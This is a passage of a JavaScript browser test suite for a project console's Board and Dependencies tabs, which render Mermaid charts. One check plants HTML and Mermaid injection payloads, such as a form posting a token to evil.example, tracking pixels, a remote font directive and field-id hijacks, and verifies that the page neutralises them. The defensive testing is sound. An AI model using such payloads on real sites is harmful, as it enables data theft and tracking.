  '  i63["#63 abcdefghijklmno pqrstuvwxyz{#124;}~"]:::review',
  '  i64["#64 a #37;#37;{init} #37; b #36;#36;x#36;#36;"]:::blocked',
  '  i65["#65 Closed long ago"]:::closed',
  '  i66["#66 In no state (2/5)"]',
].concat(CLASS_LINES).join('\n');
if (process.env.SYMPHONY_PROTOCOL) {
  await check('A2: the block pasted for the gate\'s titles is the library\'s own, as the checkout named renders it', async () => {
    assert.deepEqual(libraryBlock(GATE_ISSUES), [GATE_TEXT], 'the library writes these titles otherwise since ' + FIXTURE_COMMIT + ': paste its block again, and widen the Board tab\'s gate if R3 fails');
  });
} else console.log('SKIP A2: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; the pasted block is from ' + FIXTURE_COMMIT);
// the blocks a board's Dependencies section may hold as the board writes them: the fixture's two,
// check F's hostile, directive, math and folded titles, check M's four, and the gate's titles above
const BOARD_BLOCKS = [
  ['Goals', GOALS_TEXT],
  ['Epic #20: Draw the board (1/3)', EPIC_20_TEXT],
  ['Epic #41: An epic with hard titles (0/5)', F_EPIC_41_TEXT],
  ['Goals of another board', M_GOALS_TEXT],
  ['Epic #60: Second epic (1/6)', M_EPIC_60_TEXT],
  ['Epic #70: A goal that is an epic (0/1)', M_EPIC_70_TEXT],
  ['Epic #67: Every printable character', GATE_TEXT],
];
// hands the Board tab a board of the blocks given and waits until each is either handed the stand-in
// or shown as text, then says which
async function boardHands(blocks) {
  const { context, page, errors } = await open(boardOnlyRoutes(boardWith(blocks)), { extraRoutes: [stubRoute] });
  await signIn(page, null);
  await page.waitForFunction((n) => (window.__charts || []).length + document.querySelectorAll('#cp-board pre').length >= n, blocks.length, { timeout: 8000 });
  await sleep(300);
  const seen = await page.evaluate(() => ({ charts: window.__charts || [], shownAsText: Array.from(document.querySelectorAll('#cp-board pre')).map((pre) => pre.textContent) }));
  await context.close();
  return Object.assign(seen, { errors });
}
await check('R2: the text the Board tab hands the drawing for every block the board writes is byte for byte the board\'s, hostile, directive, math, folded and every printable character among them', async () => {
  const seen = await boardHands(BOARD_BLOCKS);
  console.log('     handed:', seen.charts.length, '| shown as text:', seen.shownAsText.length, '| first lines:', JSON.stringify(seen.charts.map((c) => c.split('\n')[1])));
  assert.deepEqual(seen.shownAsText, [], 'the Board tab refused a block the board writes');
  assert.deepEqual(seen.charts, BOARD_BLOCKS.map((b) => b[1]));
  assert.deepEqual(seen.errors, []);
});
await check('R4: a board chart the drawing script cannot draw keeps its text under the words in the Board tab', async () => {
  const { context, page, errors } = await open(boardOnlyRoutes(boardWith([['Goals', GOALS_TEXT]])), { extraRoutes: [missingRoute] });
  await signIn(page, null);
  await page.waitForFunction(() => /could not be drawn/.test((document.getElementById('cp-board') || {}).textContent || ''), null, { timeout: 8000 });
  const seen = await page.evaluate(() => ({ lead: Array.from(document.querySelectorAll('#cp-board p.admin__lead')).map((p) => p.textContent), text: Array.from(document.querySelectorAll('#cp-board pre.admin__text')).map((pre) => pre.textContent) }));
  console.log('     lead:', JSON.stringify(seen.lead));
  assert.ok(seen.lead.some((l) => /^This chart could not be drawn \(.+\); it is shown here as text\.$/.test(l)), 'no words for the undrawn chart');
  assert.deepEqual(seen.text, [GOALS_TEXT]);
  assert.deepEqual(errors, []);
  await context.close();
});
// the Board tab draws through the same graphDraw as the Dependencies tab, so its charts take the
// same look: the gate's block, a node of each of the six states, drawn there by the real Mermaid
await check('R5: the Board tab\'s charts are drawn in the console\'s look, each of the six states shaded and edged as its own, no two by hue alone, no node keeping the board\'s light colours, its box rounded', async () => {
  const { context, page, errors } = await open(boardOnlyRoutes(boardWith([['Epic #67: Every printable character', GATE_TEXT]])));
  await signIn(page, null);
  await page.waitForFunction(() => document.querySelectorAll('#cp-board .control__chart svg').length === 1, null, { timeout: 15000 });
  await toTab(page, 'board');
  const nodes = await readNodes(page, '#cp-board');
  console.log('     board nodes:', JSON.stringify(nodes.map((x) => [x.n, x.state, x.fill, x.stroke, x.width, x.dash, x.inline.length, x.rx])));
  assertShaded(nodes);
  assertNotHueAlone(nodes);
  assert.deepEqual(nodes.map((x) => [x.n, x.state]).sort((a, b) => a[0] - b[0]), [[61, 'todo'], [62, 'claimed'], [63, 'review'], [64, 'blocked'], [65, 'closed'], [66, '']]);
  assert.deepEqual(errors, []);
  await context.close();
});
if (process.env.SYMPHONY_PROTOCOL) {
  await check('R3: the Board tab hands the drawing, unchanged, the block the library named writes now for the gate\'s titles', async () => {
    const fresh = libraryBlock(GATE_ISSUES);
    assert.equal(fresh.length, 1);
    const seen = await boardHands([['Epic #67: Every printable character', fresh[0]]]);
    console.log('     handed:', seen.charts.length, '| shown as text:', seen.shownAsText.length);
    assert.deepEqual(seen.shownAsText, [], 'the Board tab refuses a block the library writes: widen its gate (BOARD_NODE_LINE) to the library\'s labels');
    assert.deepEqual(seen.charts, fresh);
    assert.deepEqual(seen.errors, []);
  });
} else console.log('SKIP R3: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; R2 hands the pasted block');

// What anyone who may push the branch board could put in its charts: a picture fetched from
// elsewhere, a form posting elsewhere, fields under the ids the page's own forms are read by, a
// directive that would load a font from elsewhere, a node made a link, a label written raw, and a
// node whose label names another number. None of them is a chart as the board writes it.
const PLANTED = [
  ['Planted: an image', 'flowchart TD\n  A["<img src=https://tracker.example/pixel.png>"]'],
  ['Planted: a form', 'flowchart TD\n  A["<form action=https://evil.example/collect method=post><input name=token><button>Go</button></form>"]'],
  ['Planted: the page\'s own fields', 'flowchart TD\n  A["<input type=hidden id=cp-task-title value=Planted><textarea id=cp-task-ask>Planted</textarea>"]'],
  ['Planted: a directive', '%%{init: {"fontFamily": "x; src: url(https://tracker.example/font.woff)"}}%%\nflowchart TD\n  i1["#1 a"]'],
  ['Planted: a link', 'flowchart TD\n  i1["#1 a"]\n  click i1 href "https://evil.example/a"'],
  ['Planted: a raw label', 'flowchart TD\n  i1["#1 <b>bold</b> $$x$$"]:::todo'],
  ['Planted: another number', 'flowchart TD\n  i1["#2 a"]:::todo'],
  ['Planted: a raw hash', 'flowchart TD\n  i1["#1 a#60;b #lt;img#gt;"]:::todo'],
];
await check('X: the Board tab draws a block of the board\'s text only where every line is one the board writes, shows any other as text that reads on its ground, and nothing planted makes an element or a request', async () => {
  const text = boardWith([['Goals', GOALS_TEXT], ['Epic #20: Draw the board (1/3)', EPIC_20_TEXT]].concat(PLANTED));
  const { context, page, errors, requests, dialogs } = await open(boardOnlyRoutes(text));
  await signIn(page, null);
  await page.waitForFunction(() => document.querySelectorAll('#cp-board .control__chart svg').length === 2, null, { timeout: 15000 });
  await sleep(800);
  const seen = await page.evaluate(() => {
    const box = document.getElementById('cp-board');
    return {
      svgs: box.querySelectorAll('svg').length,
      // the zoom's buttons over each chart and its focus's card are the page's own, not the board's
      planted: Array.from(box.querySelectorAll('img, form, input, button, textarea, select, a, iframe, object, embed')).filter((e) => !e.closest('.graph__tools--board, .graph__near--board')).length,
      own: box.querySelectorAll('.graph__tools--board button').length,
      notDrawn: Array.from(box.querySelectorAll('p')).filter((p) => /^Not drawn: this block is not a chart as the board writes it/.test(p.textContent)).length,
      shownAsText: Array.from(box.querySelectorAll('pre')).map((pre) => pre.textContent),
      // a block shown as text is no chart: its host keeps no chart's class, ground or frame
      textInChart: Array.from(box.querySelectorAll('pre')).filter((pre) => pre.closest('.control__chart')).length,
      hosts: box.querySelectorAll('[data-chart]').length,
      taskTitle: document.getElementById('cp-task-title') && !!document.getElementById('cp-task-title').closest('#dlg-task'),
      prompt: document.getElementById('cp-task-ask') && !document.getElementById('cp-task-ask').closest('#cp-board'),
      ids: document.querySelectorAll('#cp-task-title').length + ':' + document.querySelectorAll('#cp-task-ask').length,
    };
  });
  const elsewhere = requests.filter((u) => !u.startsWith(BASE) && !/^https:\/\/api\.github\.com\//.test(u) && !/^https:\/\/fonts\.(googleapis|gstatic)\.com\//.test(u));
  console.log('     seen:', JSON.stringify(Object.assign({}, seen, { shownAsText: seen.shownAsText.length })), '| requests elsewhere:', JSON.stringify(elsewhere), '| vendor loads:', vendorLoads(requests));
  assert.equal(seen.svgs, 2, 'the board\'s own two charts were not both drawn');
  assert.equal(seen.planted, 0, 'a planted element is in the Board tab');
  // the two charts' own zoom buttons, out, in and Whole chart, and nothing else the page made
  assert.equal(seen.own, 6, 'the board\'s charts do not have their zoom\'s buttons');
  assert.equal(seen.notDrawn, PLANTED.length);
  assert.deepEqual(seen.shownAsText, PLANTED.map((b) => b[1]));
  assert.equal(seen.textInChart, 0, 'a block shown as text keeps the chart\'s class');
  // only the board's own two blocks keep the text they are drawn from
  assert.equal(seen.hosts, 2, 'a planted block kept its text to be drawn');
  assert.equal(seen.taskTitle, true, 'the task dialog\'s title is not the page\'s own field');
  assert.equal(seen.prompt, true);
  assert.equal(seen.ids, '1:1', 'a planted field took one of the page\'s ids');
  assert.deepEqual(elsewhere, []);
  assert.equal(vendorLoads(requests), 1);
  // shown as text, a block reads: its words and its text on the ground each sits on, in the Board
  // tab's own colours and not a drawing's (4.5 to 1, WCAG's floor for text)
  await toTab(page, 'board');
  const reads = await contrastOf(page, '#cp-board p:has(+ pre.admin__text), #cp-board pre.admin__text');
  console.log('     shown as text, contrast:', JSON.stringify(reads.slice(0, 2)));
  assert.equal(reads.length, 2 * PLANTED.length);
  for (const r of reads) assert.ok(r.words >= 4.5, 'a block shown as text barely reads on its ground: ' + JSON.stringify(r));
  assert.deepEqual(dialogs, []);
  assert.deepEqual(errors, []);
  await context.close();
  // a board whose only blocks are planted loads no drawing script at all
  const only = await open(boardOnlyRoutes(boardWith(PLANTED)));
  await signIn(only.page, null);
  await only.page.waitForFunction((n) => document.querySelectorAll('#cp-board pre').length === n, PLANTED.length, { timeout: 8000 });
  await sleep(500);
  console.log('     planted alone: vendor loads', vendorLoads(only.requests));
  assert.equal(vendorLoads(only.requests), 0);
  assert.deepEqual(only.errors, []);
  await only.context.close();
});

await check('Y: a title on the board that opens an HTML comment hides nothing after it, and a pipe the board escapes in a heading reads as a pipe', async () => {
  const text = '# Board\n\n## Open pull requests\n\n| PR | Title | Branch |\n| --- | --- | --- |\n| #80 | Tidy <!-- the docs | mallory:main |\n\n## Queue (open issues labelled todo, unclaimed and given to no worker)\n\n| Issue | Title | Labels |\n| --- | --- | --- |\n| #23 | Write the body | todo |\n' +
    '\n## Dependencies\n\nEach open epic\'s tasks.\n\n### Goals\n\n```mermaid\n' + GOALS_TEXT + '\n```\n\n### Epic #20: Draw \\| the board (1/3)\n\n```mermaid\n' + EPIC_20_TEXT + '\n```\n';
  const { context, page, errors } = await open(boardOnlyRoutes(text), { extraRoutes: [stubRoute] });
  await signIn(page, null);
  await page.waitForFunction(() => (window.__charts || []).length === 2, null, { timeout: 8000 });
  const seen = await page.evaluate(() => {
    const box = document.getElementById('cp-board');
    return {
      cell: (Array.from(box.querySelectorAll('td')).find((td) => /Tidy/.test(td.textContent)) || {}).textContent,
      headings: Array.from(box.querySelectorAll('h2, h3, h4')).map((h) => h.textContent),
      queueRow: Array.from(box.querySelectorAll('td')).some((td) => td.textContent === 'Write the body'),
    };
  });
  console.log('     seen:', JSON.stringify(seen));
  assert.equal(seen.cell, 'Tidy <!-- the docs');
  assert.ok(seen.queueRow, 'the Queue\'s row is gone');
  assert.deepEqual(seen.headings.filter((h) => /^(Queue|Dependencies|Goals|Epic)/.test(h)), ['Queue (open issues labelled todo, unclaimed and given to no worker)', 'Dependencies', 'Goals', 'Epic #20: Draw | the board (1/3)']);
  assert.deepEqual(await page.evaluate(() => window.__charts), [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('S: the page says there is nothing to draw while no repository is chosen, before signing in and after the last one is taken off the list', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  assert.equal(await stateText(page), 'Nothing to draw yet: no repository is chosen.');
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  // the X on the repository's card in + Add repository's list takes it off; the words are read back here
  await page.click('#cp-repo-browse');
  await page.click('#rp-list [data-repo="acme/demo"] .repos__x');
  await toTab(page, 'dependencies');
  await waitGraph(page, /^Nothing to draw yet: no repository is chosen\.$/);
  await sleep(300);
  console.log('     state:', await stateText(page), '| graph children:', await page.$$eval('#cp-graph > *', (l) => l.length));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('T: an open list cut at its last page read says that an epic beyond the cut is not drawn', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  const filler = (pageNumber, count) => Array.from({ length: count }, (_, i) => issue(1000 + pageNumber * 100 + i, 'Filler ' + pageNumber + '.' + i, ['todo']));
  routes['GET /repos/acme/demo/issues'] = (url) => {
    const n = Number(url.searchParams.get('page') || 1);
    const next = '<https://api.github.com/repos/acme/demo/issues?state=open&per_page=100&page=' + (n + 1) + '>; rel="next"';
    return resp(200, n === 1 ? f.open.concat(filler(1, 100 - f.open.length)) : filler(n, 100), { headers: { Link: next } });
  };
  const { context, page, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const state = await stateText(page);
  console.log('     state:', state);
  assert.equal(state, 'Drawn from 4 reads of GitHub: 1 goal and 1 epic with sub-issues. A node\'s shade is its state; press one to see it with its neighbours. Only the first 500 open issues were read, so an epic or goal beyond them is not drawn.');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('U: the rail holds the Dependencies tab right after Tasks, with its ARIA, and the address #dependencies opens it on load', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute], path: '/symphony/control/?repo=acme/demo#dependencies' });
  // no press: the address alone names the tab
  await signIn(page, null);
  const loaded = await where(page);
  const rail = await page.$$eval('.console__rail [data-tab]', (buttons) => buttons.map((b) => b.getAttribute('data-tab')));
  const aria = await page.evaluate(() => {
    const b = document.getElementById('rail-dependencies'), p = document.getElementById('tab-dependencies');
    return {
      role: b.getAttribute('role'), controls: b.getAttribute('aria-controls'), selected: b.getAttribute('aria-selected'), tabIndex: b.tabIndex,
      name: b.querySelector('.rail__name').textContent, panelRole: p.getAttribute('role'), labelledBy: p.getAttribute('aria-labelledby'), panel: p.getAttribute('data-tab-panel'),
      inside: ['h-dependencies', 'cp-graph-state', 'cp-graph-said', 'cp-graph'].filter((id) => document.getElementById(id) && document.getElementById(id).closest('#tab-dependencies')),
      // an element the address names would be scrolled to by the browser, so none may be called dependencies
      named: !!document.getElementById('dependencies'),
    };
  });
  console.log('     loaded:', JSON.stringify(loaded), '| rail:', rail.join(' '), '| aria:', JSON.stringify(aria));
  assert.deepEqual([loaded.hash, loaded.shown, loaded.y], ['#dependencies', ['dependencies'], 0]);
  assert.ok(rail.indexOf('tasks') >= 0 && rail.indexOf('dependencies') === rail.indexOf('tasks') + 1, 'Dependencies is not the tab after Tasks: ' + rail.join(' '));
  assert.equal(rail.filter((t) => t === 'dependencies').length, 1);
  assert.deepEqual(aria, {
    role: 'tab', controls: 'tab-dependencies', selected: 'true', tabIndex: 0, name: 'Dependencies', panelRole: 'tabpanel', labelledBy: 'rail-dependencies', panel: 'dependencies',
    inside: ['h-dependencies', 'cp-graph-state', 'cp-graph-said', 'cp-graph'], named: false,
  });
  await waitGraph(page, /^Drawn from 4 reads/);
  assert.equal(await inBox(page, '#cp-graph h3'), 'in view');
  // the arrow keys walk the rail in its order: down from Tasks is Dependencies
  await toTab(page, 'tasks');
  await page.focus('#rail-tasks');
  await page.keyboard.press('ArrowDown');
  const keyed = await page.evaluate(() => [location.hash, document.activeElement && document.activeElement.id, document.getElementById('tab-dependencies').hidden, document.getElementById('rail-dependencies').getAttribute('aria-selected')]);
  console.log('     ArrowDown from Tasks:', JSON.stringify(keyed));
  assert.deepEqual(keyed, ['#dependencies', 'rail-dependencies', false, 'true']);
  // its rail button opens it from another tab, and the address follows
  await toTab(page, 'board');
  await toTab(page, 'dependencies');
  // a link to #dependencies on the page already open opens it too
  await toTab(page, 'tasks');
  await page.evaluate(() => { location.hash = '#dependencies'; });
  await page.waitForFunction(() => !document.getElementById('tab-dependencies').hidden, null, { timeout: 8000 });
  const linked = await where(page);
  assert.deepEqual([linked.hash, linked.shown, linked.y], ['#dependencies', ['dependencies'], 0]);
  assert.deepEqual(errors, []);
  await context.close();
});

// Check V's assistant: the repository's workflow carries it, the person may write, the page
// remembers issue #50, and the answer, after the header the action writes when a run ends, asks for
// the Dependencies tab in the vocabulary's own words.
const RUN = 'https://github.com/acme/demo/actions/runs/9';
const FINISHED = '**Claude finished @tester\'s task in 1m 2s** \u2014\u2014 [View job](' + RUN + ')\n\n---\n\n';
const QUESTION_AT = '2026-10-18T10:02:00Z';
function assistantRoutes(routes) {
  routes['GET /repos/acme/demo/contents/.github/symphony/assistant.md'] = { encoding: 'base64', content: b64('# The assistant\n') };
  routes['GET /repos/acme/demo/collaborators/tester/permission'] = { permission: 'write', role_name: 'write', user: { login: 'tester' } };
  routes['GET /repos/acme/demo/issues/50'] = issue(50, 'Assistant: tester', ['assistant']);
  routes['GET /repos/acme/demo/labels/assistant'] = { name: 'assistant' };
  routes['POST /repos/acme/demo/issues/50/comments'] = (url, req, call) => ({ id: 1001, created_at: QUESTION_AT, updated_at: QUESTION_AT, user: { login: 'tester', type: 'User' }, body: call.body.body });
  const answer = { id: 2001, created_at: '2026-10-18T10:02:20Z', updated_at: '2026-10-18T10:03:30Z', user: { login: 'claude[bot]', type: 'Bot' }, body: FINISHED + 'Epic #20 waits on #22, which waits on #99.\n\n```symphony\nshow dependencies\n```\n' };
  routes['GET /repos/acme/demo/issues/50/comments'] = resp(200, [{ id: 1001, created_at: QUESTION_AT, updated_at: QUESTION_AT, user: { login: 'tester', type: 'User' }, body: 'x' }, answer], { headers: { ETag: 'W/"a"' } });
  return routes;
}
await check('V: the assistant\'s "show dependencies" opens the Dependencies tab at its first chart, the choice kept for next time left as it was, the tab\'s box not scrolled, and leaves the window where it was', async () => {
  const { context, page, calls, errors } = await open(assistantRoutes(fixtureRoutes(fixture())), {
    storage: { symphony_panel_assistant: '{"acme/demo":50}' },
    constants: { ASSISTANT_POLL_MS: 400, ASSISTANT_SLOW_MS: 400, ASSISTANT_AFTER_MS: 1500 },
  });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  // the last chart chosen, as a person who read it leaves it; nothing in the tab scrolls since the
  // owner's "I literally never in any case want to scroll" of 2026-10-19, so where the answer leaves
  // the tab is which chart it shows
  await page.click('#cp-graph-focus button[data-focus="epic-20"]');
  assert.equal((await chosen(page)).shown, 'epic-20', 'the epic\'s chart was not shown, so where the answer leaves the tab says nothing');
  await page.waitForFunction(() => /The assistant issue is #50/.test(document.getElementById('cp-as-state').textContent), null, { timeout: 8000 });
  // the question is asked from the Ask Claude bar at the console's foot while the Board tab is shown,
  // so the answer is what opens the Dependencies tab
  await toTab(page, 'board');
  await page.fill('#cp-as-q', 'What blocks what?');
  await page.click('#cp-as-ask');
  const asked = await where(page);
  assert.deepEqual(asked.shown, ['board']);
  assert.ok(asked.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
  await page.waitForFunction(() => /Showing the Dependencies tab/.test(document.getElementById('cp-as-actions').textContent), null, { timeout: 10000 });
  const shown = await where(page);
  const box = await page.evaluate(() => { const b = document.getElementById('cp-graph').closest('.console__scroll'); return [b.scrollTop, b.scrollHeight - b.clientHeight]; });
  const first = await chosen(page);
  await sleep(800);
  const settled = await where(page);
  const view = await inBox(page, '#cp-graph .graph__section[data-focus="goals"] h3');
  const actions = await page.textContent('#cp-as-actions');
  const kept = await page.evaluate(() => localStorage.getItem('symphony_panel_graph_focus'));
  console.log('     after the answer:', JSON.stringify(shown), '| chart shown:', JSON.stringify(first), '| the box (scrolled, overflow):', JSON.stringify(box), '| kept:', kept, '| a moment later:', settled.y, '| first chart\'s heading:', view, '| actions:', actions);
  assert.deepEqual([shown.hash, shown.shown, shown.y, settled.y], ['#dependencies', ['dependencies'], 0, 0], 'the answer did not open the Dependencies tab, or moved the window');
  assert.deepEqual(first, { pressed: 'goals', shown: 'goals' }, 'the answer did not show the first chart');
  assert.deepEqual(JSON.parse(kept), { 'acme/demo': 'epic-20' }, 'the answer changed the chart kept for next time');
  assert.ok(box[0] === 0 && box[1] <= 1, 'the tab\'s box scrolls: ' + JSON.stringify(box));
  assert.equal(view, 'in view');
  assert.match(actions, /Showing the Dependencies tab, which this page draws\./);
  // the next question tells the assistant the section the page is at
  await page.fill('#cp-as-q', 'And now?');
  await page.click('#cp-as-ask');
  let next = null;
  for (let i = 0; i < 40 && !next; i++) { next = calls.filter((c) => c.key === 'POST /repos/acme/demo/issues/50/comments')[1]; if (!next) await sleep(100); }
  console.log('     the next question\'s state:', JSON.stringify(next && next.body && next.body.body.split('```symphony-state\n')[1]));
  assert.ok(next, 'the second question was not sent');
  assert.match(next.body.body, /\nsection: Dependencies\n/);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('W: Centre its row pressed on a task the tables do not hold stays in this tab, says why here and on the message line, and leaves the window where it was', async () => {
  const { context, page, errors, opened } = await open(fixtureRoutes(fixture()));
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  // #21 and #22 are in the epic's chart; the tiles show the first chart, so show the epic's
  await page.click('#cp-graph-focus button[data-focus="epic-20"]');
  // an earlier press, which opened the Tasks tab and said its focus on the message line
  await page.click('#cp-graph g.node[id*="-flowchart-i22-"]');
  await waitNear(page, 22);
  await page.click('#cp-graph .graph__section[data-focus="epic-20"] .graph__nearacts button');
  await page.waitForFunction(() => /Focused #22/.test(document.getElementById('msg').textContent), null, { timeout: 8000 });
  await toTab(page, 'dependencies');
  // back to the whole chart, then #21, which is closed, so no task table holds it
  await page.click('#cp-graph .graph__section[data-focus="epic-20"] .graph__fit');
  await page.click('#cp-graph g.node[id*="-flowchart-i21-"]');
  await waitNear(page, 21);
  const before = await where(page);
  await page.click('#cp-graph .graph__section[data-focus="epic-20"] .graph__nearacts button');
  const after = await where(page);
  await sleep(800);
  const settled = await where(page);
  const said = await page.textContent('#cp-graph-said');
  const msg = await msgText(page);
  console.log('     after Centre its row:', JSON.stringify(after), '| a moment later:', settled.y, '| said:', said, '| message line:', msg);
  const words = '#21 is the focus, but it is not in the task tables (closed, a pull request, or without the protocol\'s labels).';
  assert.deepEqual([before.hash, before.shown], ['#dependencies', ['dependencies']]);
  assert.deepEqual([after.hash, after.shown, after.y, settled.hash, settled.shown, settled.y], ['#dependencies', ['dependencies'], 0, '#dependencies', ['dependencies'], 0], 'the press left the tab or moved the window');
  assert.equal(said, words);
  // the message line follows the press, so it no longer says the earlier focus
  assert.equal(msg, words);
  assert.equal(await page.$$eval('#cp-app tr.control__focus', (rows) => rows.length), 0);
  assert.deepEqual(opened.map((p) => p.url()), []);
  assert.deepEqual(errors, []);
  await context.close();
});

// The focus strip: with two charts or more, chips show one epic's chart at a time, a zoomed-out
// goals chart, or All, the next step of the owner's 2026-10-17 ask (focus one epic, or a zoomed-out
// view of epics to goals; docs/research/control-board-graph.md).
await check('AA: the focus strip lists All, Goals and each epic as tiles, each saying what its chart is, its title and how far it has got, shows the first chart by default and hides the rest, with its ARIA', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await page.waitForSelector('#cp-graph .graph__section', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const strip = await page.evaluate(() => {
    const s = document.getElementById('cp-graph-focus');
    return {
      hidden: s.hidden, role: s.getAttribute('role'), label: s.getAttribute('aria-label'),
      chips: Array.from(s.querySelectorAll('.graph__chip')).map((b) => [b.getAttribute('data-focus'), b.getAttribute('aria-label'), b.getAttribute('aria-pressed')]),
      parts: Array.from(s.querySelectorAll('.graph__chip')).map((b) => ['.graph__tkind', '.graph__ttitle', '.graph__tfoot'].map((c) => b.querySelector(c).textContent)),
      sections: Array.from(document.querySelectorAll('#cp-graph .graph__section')).map((sec) => [sec.getAttribute('data-focus'), sec.hidden]),
    };
  });
  console.log('     strip:', JSON.stringify(strip));
  assert.equal(strip.hidden, false, 'the strip is hidden although there are two charts');
  assert.equal(strip.role, 'group');
  assert.ok(strip.label, 'the strip has no accessible name');
  assert.deepEqual(strip.chips.map((c) => c[0]), ['all', 'goals', 'epic-20']);
  assert.deepEqual(strip.chips.map((c) => c[1]), ['All: Every chart, 2 charts', 'Goals: The goal and its epics, 2 issues', 'Epic #20: Draw the board, 1 of 3 closed']);
  assert.deepEqual(strip.parts, [['All', 'Every chart', '2 charts'], ['Goals', 'The goal and its epics', '2 issues'], ['Epic #20', 'Draw the board', '1 of 3 closed']]);
  assert.deepEqual(strip.chips.map((c) => c[2]), ['false', 'true', 'false'], 'the first chart, Goals, is not the one pressed');
  assert.deepEqual(strip.sections, [['goals', false], ['epic-20', true]], 'the first chart is not shown alone');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AB: a chip shows its chart and hides the rest, All shows every chart, and aria-pressed follows', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await page.waitForSelector('#cp-graph .graph__section', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const read = () => page.evaluate(() => ({
    pressed: Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((b) => b.getAttribute('aria-pressed') === 'true').map((b) => b.getAttribute('data-focus')),
    shown: Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden).map((s) => s.getAttribute('data-focus')),
  }));
  await page.click('#cp-graph-focus button[data-focus="epic-20"]');
  const epic = await read();
  await page.click('#cp-graph-focus button[data-focus="all"]');
  const all = await read();
  await page.click('#cp-graph-focus button[data-focus="goals"]');
  const goals = await read();
  console.log('     epic:', JSON.stringify(epic), '| all:', JSON.stringify(all), '| goals:', JSON.stringify(goals));
  assert.deepEqual(epic, { pressed: ['epic-20'], shown: ['epic-20'] });
  assert.deepEqual(all, { pressed: ['all'], shown: ['goals', 'epic-20'] });
  assert.deepEqual(goals, { pressed: ['goals'], shown: ['goals'] });
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AC: the chosen chip is kept per repository in this browser, restored on load and on Refresh, and written on a press', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), {
    extraRoutes: [stubRoute],
    storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20', 'acme/other': 'all' }) },
  });
  await signIn(page);
  // the restored choice hides the first section, so wait for the sections to be there, not shown
  await page.waitForSelector('#cp-graph .graph__section', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const shown = () => page.evaluate(() => Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden).map((s) => s.getAttribute('data-focus')));
  const restored = await shown();
  await page.click('#cp-graph-focus button[data-focus="goals"]');
  const saved = await page.evaluate(() => localStorage.getItem('symphony_panel_graph_focus'));
  await page.click('#cp-refresh');
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const afterRefresh = await shown();
  console.log('     restored:', JSON.stringify(restored), '| saved after a press:', saved, '| after Refresh:', JSON.stringify(afterRefresh));
  assert.deepEqual(restored, ['epic-20'], 'the saved choice for this repository was not restored');
  assert.deepEqual(JSON.parse(saved), { 'acme/demo': 'goals', 'acme/other': 'all' }, 'the press did not write the choice for this repository alone');
  assert.deepEqual(afterRefresh, ['goals'], 'Refresh did not restore the kept choice');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AD: a repository with one chart shows no strip and the one chart whole', async () => {
  const one = {
    open: [issue(40, 'Lone epic', ['epic'], subs(0, 1)), issue(41, 'Only task', ['todo'])],
    subIssues: { 40: [issue(41, 'Only task', ['todo'])] },
    blockedBy: {},
  };
  const { context, page, errors } = await open(fixtureRoutes(one), { extraRoutes: [stubRoute] });
  await signIn(page);
  await page.waitForSelector('#cp-graph .graph__section', { timeout: 15000 });
  await waitGraph(page, /^Drawn from/, 15000);
  const seen = await page.evaluate(() => ({
    stripHidden: document.getElementById('cp-graph-focus').hidden,
    chips: document.querySelectorAll('#cp-graph-focus .graph__chip').length,
    sections: Array.from(document.querySelectorAll('#cp-graph .graph__section')).map((s) => [s.getAttribute('data-focus'), s.hidden]),
  }));
  console.log('     one chart:', JSON.stringify(seen));
  assert.equal(seen.stripHidden, true, 'the strip shows for a single chart');
  assert.equal(seen.chips, 0, 'the strip has chips for a single chart');
  assert.deepEqual(seen.sections, [['epic-40', false]], 'the one chart is not shown');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AE: a kept choice that names a chart no longer there falls back to the first', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), {
    extraRoutes: [stubRoute],
    storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-999' }) },
  });
  await signIn(page);
  await page.waitForSelector('#cp-graph .graph__section', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const seen = await page.evaluate(() => ({
    pressed: Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((b) => b.getAttribute('aria-pressed') === 'true').map((b) => b.getAttribute('data-focus')),
    shown: Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden).map((s) => s.getAttribute('data-focus')),
  }));
  console.log('     gone choice:', JSON.stringify(seen));
  assert.deepEqual(seen.pressed, ['goals'], 'a gone choice did not fall back to the first chart');
